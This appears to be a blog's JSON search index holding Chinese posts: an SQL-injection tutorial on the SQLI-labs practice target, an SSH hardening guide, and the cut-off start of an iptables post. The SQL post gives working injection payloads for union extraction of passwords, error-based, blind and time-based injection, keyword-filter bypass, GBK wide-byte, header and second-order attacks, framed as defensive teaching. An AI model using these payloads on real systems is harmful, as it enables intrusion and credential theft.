[{"content":"学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性\n以下实验均以 SQLI labs 靶场为例\n1. 联合注入（Union-Based） 来自：Less-1\n这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\n攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：\n其中关键步骤是构造 1' --+：\n通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，是其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1' 通过 --+ 来注释后面的 ' LIMIT 0,1\u0026quot;; 基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：\n通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3 判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用 在某个可回显的位置执行 select 语句：?id=-1' union select 1,2, database() --+ 你可以能会想，这又啥用呢？但实际上在没有严格权限管理的数据库上，我们可以通过构造下面语句获得所有库表的信息\n# 1. 查库：查询所有数据库的名称 SELECT schema_name FROM information_schema.schemata # 2. 查表：查询指定数据库中的所有表 SELECT table_name FROM information_schema.tables WHERE table_schema=\u0026#39;security\u0026#39; # 3. 查列：查询表中的所有列 SELECT column_name FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39; # 4. 查字段：获取用户表中的敏感数据，如用户名和密码 SELECT username, password FROM security.users 举个例子：我们可以通过构造语句，获取所有的账户和密码，将其通过 ~ 进行分隔：?id=-1' union select 1,2, group_concat(concat_ws('~',username,password)) from security.users --+\n2. 报错注入（Error-Based） 来自：Less-5\n不是所有场景都会回显数据库值，那是否就安全了？攻击者可以通过显示的错误来获取数据库值\n# 0x7e 为 16 进制编码的 ~ SELECT updatexml(1, concat(0x7e, database()), 1) FROM DUAL; 通过函数构造错误，将期望的信息以错误的信息提示出来：?id=1' and updatexml(1,concat(0x7e,(database())),1); --+\nXPATH syntax error: \u0026#39;~security\u0026#39; 通过上面的错误我们就知道当前库名为：security，类似地可以执行任意语句\n3. 布尔盲注（Boolean-Based Blind） 来自：Less-7\n一般项目都会隐藏错误堆栈，只提示成功或者失败，可以使用布尔盲注：?id=1')) and left((select database()),1)='s'--+\n通过 order by 测列宽 ?id=1')) order by 4 --+ 通过 left 函数，逐个字符地遍历判断 ?id=1')) and left((select database()),1)='s'--+ ，当前库名首字母为 s 时会提示正确，否则提示错误 tips：这里使用是 ?id=1')) 有别于前文的 1'，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误\n通过类似的原理我们可以按照行列顺序依次遍历：\n# 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号 ?id=1\u0026#39;)) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))\u0026gt;1--+ 再配合二分法提高效率，最终也能得到所有库表信息\n4. 时间盲注（Time-Based Blind） 来自：Less-9\n如果没给出提示，或者无论正确与否都给出相同提示，那该怎么办呢？可以使用时间盲注\n在语句中调用 sleep() 函数，通过网页响应速度来判断是否为我们预期的结果\n构造 ?id=10' and sleep(5) --+ 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)\n?id=1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))\u0026gt;1112,1,sleep(5))--+ 5. 绕过过滤（Bypass） 来自：Less-25\n既然可以通过盲注来执行任意指令，那就直接加强参数的检查， replace 所有的 or 和 and\n攻击者可以通过双写的方式绕过：oorr → 被过滤后变为 or，也可以通过 || 替代 OR，\u0026amp;\u0026amp; 替代 AND\n# ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0 ?id=10\u0026#39; oorrder by 2;%00 6. 宽字节注入（GBK Bypass） 来自：Less-32\n既然替换保留字符也能被绕过，那就将参数中的单引号进行转义：' 转义为 \\'\n攻击者可以通过宽字节注入的方式使得转义符号失效，构造请求?id=1%df' order by 4 --+\n单引号 为 %27，而 \\ 为 %5c。PHP 后端在接受到参数时发现有单引号，就自动在其前面加上\\，变成 \\'，即 %5c%27\n我们在其前面加上 %df，构造出 %df\\'，即 %df%5c%27\n数据库使用 GBK 编码时 %df%5c 会被解码为 運，\\ 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 utf-8 转换为 utf-16 或 utf-32，将 \u0026rsquo; 转为 utf-16\n7. Header 注入（HTTP Header Injection） 来自：Less-18\n假设我严格地检查所有参数，那是否就安全了呢？\n攻击者可以在插入请求头信息时进行攻击，下面为常见的登陆信息收集，uagent 来自用户的请求头 User-Agent\n$insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; 在访问页面时构造 HTTP Header：User-Agent: 'and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'= '1，配合报错注入获得库表信息。类似的攻击还可以使用 Referer 和 Cookie 等等\n8. 二次注入（Second-Order） 来自：Less-24\n假设我们对所有参数和 HTTP Header 都严格检查，肯定就安全了吧？攻击者还可以通过二次注入的方式绕过你的检查\n这是一个经典的用户登陆页面，包含创建用户，登陆后可以修改用户密码\n修改密码的 SQL 如下：\nUPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; 攻击者可以通过构建用户 admin'#\n登陆该用户修改密码，实现间接修改掉 admin 超级用户的密码：\nUPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;admin\u0026#39;# and password=\u0026#39;$curr_pass\u0026#39; # 移除注释，等价于 UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;admin\u0026#39; 结尾 我们可能觉得现代框架和工具链可以避免这些问题，但通过上面的例子可以感受到，道高一尺魔高一丈，稍有疏忽就可能被利用\nSQL注入的本质是：攻击者通过操控用户输入的方式，改变原本的SQL查询结构，从而绕过应用程序的安全策略，执行恶意指令。我们可以从不同的角度进行防御：\n校验用户输入 操作前进行详尽的校验包括已入库的数据 细化数据库账户权限 结合 WAF、日志监控、定期渗透测试 \u0026hellip; SQL注入攻击揭示的不仅是技术漏洞，更指向一个通用安全原则：任何外部输入都可能在与现有流程交互时引发非预期行为。这一安全思维可迁移至日常生活风险防控体系：\n查杀未知邮件的附件 逐一检查合同 对陌生通知通过官方渠道二次确认 仔细评审合作方提供的材料 \u0026hellip; 参考资料 本文只为抛砖引玉，精简了部分细节，详情可以参考以下教程：\nSQLI labs 靶场精简学习记录 sqli-labs基础教程/sqli-labs注入教程20200124.pptx sql注入之sqli-labs系列教程(less1-10) sqli-labs(62-65)-challenges-盲注 sqli-labs靶场Less-62题解（少于130次） ","permalink":"https://aaronlinv.github.io/posts/sql-injection/","summary":"\u003cp\u003e学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性\u003c/p\u003e\n\u003cp\u003e以下实验均以 \u003ca href=\"https://github.com/Audi-1/sqli-labs\"\u003eSQLI labs\u003c/a\u003e 靶场为例\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 id=\"1-联合注入union-based\"\u003e1. 联合注入（Union-Based）\u003c/h4\u003e\n\u003cp\u003e来自：\u003ca href=\"https://github.com/Audi-1/sqli-labs/tree/master/Less-1\"\u003eLess-1\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../sql-injection/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这是一个常见的查询页面。\u003ccode\u003ehttp://127.0.0.1/Less-1/?id=1\u003c/code\u003e ，通过 \u003ccode\u003eid=1\u003c/code\u003e 传递参数。后端常见的 SQL 写法：\u003ccode\u003eSELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e攻击者可以通过构造 \u003ccode\u003eid\u003c/code\u003e 的参数值，执行任意的 SQL 语句：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../sql-injection/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中关键步骤是构造 \u003ccode\u003e1' --+\u003c/code\u003e：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e通过某个具体参数 \u003ccode\u003e1\u003c/code\u003e 和 单引号 \u003ccode\u003e'\u003c/code\u003e 来结束前面的语句：\u003ccode\u003eSELECT * FROM users WHERE id='\u003c/code\u003e，是其成为合法的 SQL 语句： \u003ccode\u003eSELECT * FROM users WHERE id='1'\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e通过 \u003ccode\u003e--+\u003c/code\u003e 来注释后面的 \u003ccode\u003e' LIMIT 0,1\u0026quot;;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e基于上面的原理，我们就可以在 \u003ccode\u003e1'\u003c/code\u003e 和 \u003ccode\u003e--+\u003c/code\u003e 之间插入语句了，进行联合注入，具体步骤如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e通过 \u003ccode\u003eorder by\u003c/code\u003e 测列宽：\u003ccode\u003e?id=-1' order by 4 --+\u003c/code\u003e，通过不断尝试和错误提示可以得知列宽为 3\n\u003cimg loading=\"lazy\" src=\"../sql-injection/3.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e判断回显值对应的位置，\u003ccode\u003e?id=-1' union select 1,2,3 --+\u003c/code\u003e，2 和 3 这两个位置都可供使用\n\u003cimg loading=\"lazy\" src=\"../sql-injection/4.png\"\u003e\u003c/p\u003e","title":"永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性"},{"content":"安全外壳协议（Secure Shell Protocol，简称SSH）是一种加密的网络传输协议，属于应用层协议。OpenSSH 是最流行的 SSH 实现，它是大量操作系统的默认组件\nOpenSSH 套件由以下工具组成：\n远程操作使用：ssh, scp 和 sftp 密钥管理：ssh-add, ssh-keysign, ssh-keyscan 和 ssh-keygen 服务端： sshd, sftp-server 和 ssh-agent 使用 SSH 连接服务器 1. 客户端创建公私钥对 密钥类型选择 ed25519 椭圆曲线，它生成的公私钥都要比 RSA 更短，具有较高的安全性和性能\n# - a KDF (Key Derivation Function) 的迭代次数 默认：16 ，防止暴力破解 # - t 类型 # Ubuntu 22.04 默认：RSA 3072；Mac OS 默认：ED25519 256 # - C 备注，可以备注上创建年月，定期更换私钥 ssh-keygen -a 256 -t ed25519 -C \u0026#34;Brandon+2025-01@MacBook\u0026#34; # 可以手动指定路径和密码，也可以一路回车 在 ~/.ssh 下会生成公私钥对\n. ├── [ 411] id_ed25519 ├── [ 98] id_ed25519.pub # 私钥需要妥善保管，避免暴露 cat id_ed25519 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACCRtC9cJJBFwvVsp4vV058ci8lSHNrf2qcx8W+umtK7OwAAAKArJx9PKycf... -----END OPENSSH PRIVATE KEY----- # .pub 结尾为公钥 cat id_ed25519.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJG0L1wkkEXC9Wyni9XTnxyLIt/zHxb66a0rs7 Brandon+2025-01@MacBook 2. 在服务器上添加公钥 将上面客户端生成的公钥 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJG0L1wkkEXC9Wyni9XTnxyLIt/zHxb66a0rs7 Brandon+2025-01@MacBook 加入到服务端 ~/.ssh/authorized_keys，每个私钥占据一行\n也可以使用 `ssh-copy-id\nssh-copy-id -i ~/.ssh/id_ed25519.pub ubuntu@192.168.64.6 3. 客户端 ssh 连接 # 登录的用户名@目标主机的 IP 地址 ssh root@192.168.16.13 # 首次连接某个服务器会提示 The authenticity of host \u0026#39;192.168.16.13 (192.168.16.13)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:QawKK4qYtzv/WyymFO64Yby5oxo9bVYZu0TQRvLZsL8. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? 这是需要要求你通过 服务端公钥指纹 来验证服务端的身份，避免中间人攻击。在确认指纹后输入 yes 完成连接，ssh 会将公钥信息写入到 ~/.ssh/known_hosts 中。后续连接如果服务端指纹变更，就说明可能出现了中间人攻击，ssh 会在连接时提示指纹不一致\n获取服务端公钥指纹 在 服务端 /etc/ssh/ 下有多对公私钥：\n├── [1.3K] ssh_host_dsa_key ├── [ 609] ssh_host_dsa_key.pub ├── [ 513] ssh_host_ecdsa_key ├── [ 181] ssh_host_ecdsa_key.pub ├── [ 411] ssh_host_ed25519_key ├── [ 101] ssh_host_ed25519_key.pub ├── [2.5K] ssh_host_rsa_key ├── [ 573] ssh_host_rsa_key.pub 以 ed25519 为例，查看公钥指纹：\n# -l：列出密钥的指纹 # -f：后面跟要查看的文件路径 ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub 256 SHA256:WykOLKFPEwaC42OM8B5EgFBS5RlgV4qvXxkCIxPE6h4 root@VM-12-5-ubuntu (ED25519) 如果无法登陆服务器，可以直接获取，相对来说还是找管理员索要指纹更加安全\nssh-keyscan -t ed25519 -p 22 192.168.16.13 2\u0026gt;/dev/null | ssh-keygen -E sha256 -lf - 256 SHA256:WykOLKFPEwaC42OM8B5EgFBS5RlgV4qvXxkCIxPE6h4 root@VM-12-5-ubuntu (ED25519) 关于 ssh 还有一个常见用法，就是测试 GitHub 连通性\n# 测试 GitHub 连接 # -T: 禁用伪终端分配 ssh -T git@github.com # 回应： # Hi someone! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. 连接过程 加密连接最重要的就是解决 密钥传递 的问题，如果传递密钥时密钥被窃取，那么后续的加密将毫无意义\n为了避免传递时泄露密钥，ssh 采用了 非对称加密算法，即公私钥的这种方式。服务器和客户端在 确认对方的公钥是安全的 之后，就可以通过对方的公钥加密数据，对方通过私钥解密数据，实现安全地传输数据。客户端与服务器连接的具体过程：\n建立 TCP 连接 协商 SSH 版本：SSH1 或 SSH2 协商使用的 算法：加密、密钥交换、消息认证码等 用协商好的密钥交换算法（例如 Elliptic Curve Diffie-Hellman）生成共享密钥，通过它进行回话的对称加密5 客户端验证服务器身份: 为了防止中间人攻击，比较服务器的公钥指纹或密钥与客户端已知的主机是否一致, 不一致或者首次连接会提示用户验证服务器的公钥指纹 服务器验证用户身份: 服务器验证客户端的身份 会话建立: 身份验证成功后，客户端和服务器之间建立加密的会话 Elliptic Curve Diffie-Hellman： 双方分别生成一对临时 公私钥对，将自己的 临时公钥 发送给对方，双方都可以通过 对方临时公钥 + 自己临时私钥 生成 共享密钥，这个共享密钥双方相同。共享密钥 作为 KDF 的输入，生成多个密钥，用于加密、完整性校验\n交换哈希 (Exchange Hash)：为了确保密钥交换过程没有被篡改，SSH 会计算一个交换哈希值，服务器会对交换哈希进行签名（这里用的是服务器私钥，即 /etc/ssh/ 下的私钥）。哈希值包含了密钥交换过程中交换的所有数据，包括客户端和服务器版本、算法协商结果、密钥交换参数等\nssh 连接过程的数据包：\n从流程可以看出，ssh 虽然可以保证会话传输安全，但是无法保证对方身份的真实性，所以在连接时要 确认公钥指纹\n常见问题 回话保持 删除 authorized_keys 中的 key，该 key 已打开的会话不会被断开\n可以通过 pkill 终止特定用户的 SSH 会话：\npkill -u $username sshd 权限导致登陆失败 在 man ssh 中：\n~/.ssh/: the recommended permissions are read/write/execute for the user, and not accessible by others. ~/.ssh/authorized_keys: the recommended permissions are read/write for the user, and not accessible by others.\n保证 ~/.ssh authorized_keys 只有 所有者 可以访问修改\n如果我们修改权限：chmod 666 authorized_keys，这样登陆会失败：\nshell failed: ssh failed to authenticate: \u0026#39;Access denied for \u0026#39;publickey\u0026#39;. Authentication that can continue: publickey\u0026#39; 在 sshd 的日志中也可以看到原因：\ntail -f /var/log/auth.log 2025-01-17T11:36:41.734631+08:00 iptables sshd[1294]: Authentication refused: bad ownership or modes for file /home/ubuntu/.ssh/authorized_keys .ssh 子目录中的 config 通过 config 简化 ssh 连接\nHost aliyun HostName 192.168.1.100 User tom IdentityFile ~/.ssh/id_rsa Port 22 # ssh $Host 快速连接 ssh aliyun 安全防护 查看连接 # who 查看当前登录用户的方法。它会显示用户名、终端、登录时间以及远程主机（如果是 SSH 连接） who ubuntu pts/0 2025-01-20 17:43 (192.168.64.1) # w 命令提供更详细的信息，包括当前登录用户、他们正在运行的进程、系统负载等。 w 19:44:32 up 14:48, 2 users, load average: 0.06, 0.04, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT ubuntu 192.168.64.1 17:43 3days 0.00s 0.05s sshd: ubuntu [priv] ubuntu 192.168.64.1 17:43 3days 0.00s ? sshd: ubuntu [priv] # last 命令显示最近登录的用户列表，包括用户名、终端、登录时间、远程主机和登出时间 last ubuntu pts/0 192.168.64.1 Mon Jan 20 17:43 still logged in ubuntu pts/0 192.168.64.1 Fri Jan 17 11:33 - 11:47 (00:13) reboot system boot 6.8.0-51-generic Fri Jan 17 11:33 still running reboot system boot 6.8.0-51-generic Thu Jan 9 16:58 - 17:11 (00:13) ubuntu pts/0 192.168.64.1 Thu Jan 9 16:57 - 16:58 (00:00) # lastlog 命令显示每个用户最后一次登录的时间 lastlog Username Port From Latest root **Never logged in** daemon **Never logged in** bin **Never logged in** sys **Never logged in** ubuntu pts/0 192.168.64.1 Mon Jan 20 17:43:58 +0800 2025 安全策略 pkill 会话 ps ajfx PPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 1 1621867 1621867 1621867 ? -1 Ss 0 0:49 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 sta 1621867 2226258 2226258 2226258 ? -1 Ss 0 0:00 \\_ sshd: root@pts/5 2226258 2226414 2226414 2226414 pts/5 2227480 Ss 0 0:00 \\_ bash --rcfile /dev/fd/63 2226414 2227480 2227480 2226414 pts/5 2227480 R+ 0 0:00 \\_ ps ajfx 通过 SID 可以 kill 掉整个 session，如果 pikill tmux 等软件创建的 session，这些 session 的进程还是会继续运行\n# -e: 显示进程将被终止 # -s: 指定一个或多个会话 ID # pkill -e -s $SID pkill -e -s 2226258 排查用户和密钥 查看非 root 可登录的账号\nawk -F: \u0026#39;BEGIN {OFS=\u0026#34;:\u0026#34;} $3 != 0 \u0026amp;\u0026amp; $7 !~ /\\/bin\\/false|\\/nologin/ {print $1}\u0026#39; /etc/passwd 查看允许 ssh 登陆的公钥：\ncat ~/.ssh/authorized_keys\n禁用密码登陆 grep PasswordAuthentication /etc/ssh/sshd_config 注意：这里是 sshd_config，而不是少了 d 的 ssh_config\n如果 /etc/ssh/sshd_config.d 中的某个文件中定义了某个配置选项，那么它会覆盖 /etc/ssh/sshd_config 文件中相同的配置\n例如在 /etc/ssh/sshd_config.d/50-cloud-init.conf 中配置了 PasswordAuthentication yes，那么 /etc/ssh/sshd_config 中修改 PasswordAuthentication 的值都会被覆盖，即密码登陆一直有效，修改为 PasswordAuthentication no 后重新 sshd：sudo systemctl restart sshd，就会提示只允许密钥登陆：\nssh root@192.168.64.6 root@192.168.64.6: Permission denied (publickey). 如果没有关闭密码登陆，就可能会被暴力破解，查询不同用户被尝试登陆的次数：\ngrep \u0026#34;Failed password\u0026#34; /var/log/auth.log|perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?)from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|sort|uniq -c|sort -nr 5611 root 2013 invalid user hadoop 1975 invalid user inspur 1973 invalid user cloud 285 invalid user roo 101 invalid user test 84 invalid user user 72 invalid user admin 68 invalid user oracle 61 invalid user postgres 61 invalid user git 48 invalid user ubuntu 31 invalid user test1 28 invalid user amandabackup 24 invalid user pcpqa 22 invalid user ftpuser 21 invalid user test2 21 invalid user chenly 查询登陆成功的 IP\ngrep \u0026#34;Accepted\u0026#34; /var/log/auth.log | awk \u0026#39;{print $11}\u0026#39; | sort | uniq 其他安全配置可以参考：\nLinux 应急响应手册 v1.9 - NOP Team 如何配置安全的 SSH 服务 SSH安全加固指南\n登陆告警 在用户登陆时向钉钉发送告警，参考自：VPS 安全加固之用户登录后向 telegram 发送登录信息\ncd /etc/profile.d/ vim ssh-login-alerm.sh #!/bin/bash # 钉钉机器人 Webhook URL dingtalk_webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=$token\u0026#34; # 获取系统信息，并进行转义以避免 JSON 解析错误 message=$(hostname \u0026amp;\u0026amp; TZ=UTC-8 date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39; \u0026amp;\u0026amp; who \u0026amp;\u0026amp; w | awk \u0026#39;BEGIN{OFS=\u0026#34;\\t\u0026#34;}{print $1,$8}\u0026#39; | sed \u0026#39;s/\\\\/\\\\\\\\/g;s/\\n/\\\\n/g;s/\u0026#34;/\\\\\u0026#34;/g\u0026#39;) # 使用 curl 发送消息到钉钉机器人 curl -s -X POST \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#34;{\\\u0026#34;msgtype\\\u0026#34;:\\\u0026#34;text\\\u0026#34;,\\\u0026#34;text\\\u0026#34;:{\\\u0026#34;content\\\u0026#34;:\\\u0026#34;ssh: ${message}\\\u0026#34;}}\u0026#34; \\ \u0026#34;${dingtalk_webhook}\u0026#34; || echo \u0026#34;Error sending DingTalk message.\u0026#34; #可选：添加日志记录 echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - SSH login detected. Message sent to DingTalk (or error occurred).\u0026#34; \u0026gt;\u0026gt; /var/log/ssh_login_dingtalk.log # 权限设置为 555 ，这样登陆任何用户都会执行告警 chmod 555 /etc/profile.d/ssh-login-alerm.sh 登陆后钉钉会收到一条消息:\nssh: localhost 2025-01-23 22:17:16 root pts/0 2025-01-23 22:17 (192.168.64.5) 22:17:16\tload USER\tWHAT root\tbash 参考资料 Secure Shell - wiki OpenSSH - wiki SSH-Keygen的更安全用法 It’s 2023. You Should Be Using an Ed25519 SSH Key (And Other Current Best Practices) 验证远程主机SSH指纹 什么是SSH？ 图解SSH原理 SSH协议解析及wireshark抓包分析 SSH协议握手核心过程\n","permalink":"https://aaronlinv.github.io/posts/%E9%87%8D%E6%8B%BE-ssh%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/","summary":"\u003cp\u003e安全外壳协议（Secure Shell Protocol，简称SSH）是一种加密的网络传输协议，属于应用层协议。\u003ca href=\"https://www.openssh.com/\"\u003eOpenSSH\u003c/a\u003e 是最流行的 SSH 实现，它是大量操作系统的默认组件\u003c/p\u003e\n\u003cp\u003eOpenSSH 套件由以下工具组成：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e远程操作使用：\u003cstrong\u003essh\u003c/strong\u003e, \u003cstrong\u003escp\u003c/strong\u003e 和 sftp\u003c/li\u003e\n\u003cli\u003e密钥管理：ssh-add, ssh-keysign, ssh-keyscan 和 \u003cstrong\u003essh-keygen\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e服务端： \u003cstrong\u003esshd\u003c/strong\u003e, sftp-server 和 ssh-agent\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"使用-ssh-连接服务器\"\u003e使用 SSH 连接服务器\u003c/h2\u003e\n\u003ch3 id=\"1-客户端创建公私钥对\"\u003e1. 客户端创建公私钥对\u003c/h3\u003e\n\u003cp\u003e密钥类型选择 \u003ccode\u003eed25519\u003c/code\u003e 椭圆曲线，它生成的公私钥都要比 \u003ccode\u003eRSA\u003c/code\u003e 更短，具有较高的安全性和性能\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - a KDF (Key Derivation Function) 的迭代次数 默认：16 ，防止暴力破解\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - t 类型\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Ubuntu 22.04 默认：RSA 3072；Mac OS 默认：ED25519 256\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - C 备注，可以备注上创建年月，定期更换私钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen -a \u003cspan class=\"m\"\u003e256\u003c/span\u003e -t ed25519 -C \u003cspan class=\"s2\"\u003e\u0026#34;Brandon+2025-01@MacBook\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 可以手动指定路径和密码，也可以一路回车\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在 \u003ccode\u003e~/.ssh\u003c/code\u003e 下会生成公私钥对\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├── \u003cspan class=\"o\"\u003e[\u003c/span\u003e 411\u003cspan class=\"o\"\u003e]\u003c/span\u003e  id_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├── \u003cspan class=\"o\"\u003e[\u003c/span\u003e  98\u003cspan class=\"o\"\u003e]\u003c/span\u003e  id_ed25519.pub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 私钥需要妥善保管，避免暴露\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat id_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----BEGIN OPENSSH PRIVATE KEY-----\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eQyNTUxOQAAACCRtC9cJJBFwvVsp4vV058ci8lSHNrf2qcx8W+umtK7OwAAAKArJx9PKycf...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----END OPENSSH PRIVATE KEY-----\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# .pub 结尾为公钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat id_ed25519.pub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJG0L1wkkEXC9Wyni9XTnxyLIt/zHxb66a0rs7 Brandon+2025-01@MacBook\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-在服务器上添加公钥\"\u003e2. 在服务器上添加公钥\u003c/h3\u003e\n\u003cp\u003e将上面客户端生成的公钥 \u003ccode\u003essh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJG0L1wkkEXC9Wyni9XTnxyLIt/zHxb66a0rs7 Brandon+2025-01@MacBook\u003c/code\u003e\n加入到服务端 \u003ccode\u003e~/.ssh/authorized_keys\u003c/code\u003e，每个私钥占据一行\u003c/p\u003e","title":"重拾 SSH：从基础到安全加固"},{"content":"iptables 是一个常看常忘的命令，本文试图从应用的角度理解它\niptables 是运行在用户空间的应用软件，通过控制 Linux 内核 netfilter 模块，来管理网络数据包的处理和转发\n一些常用的场景 1. 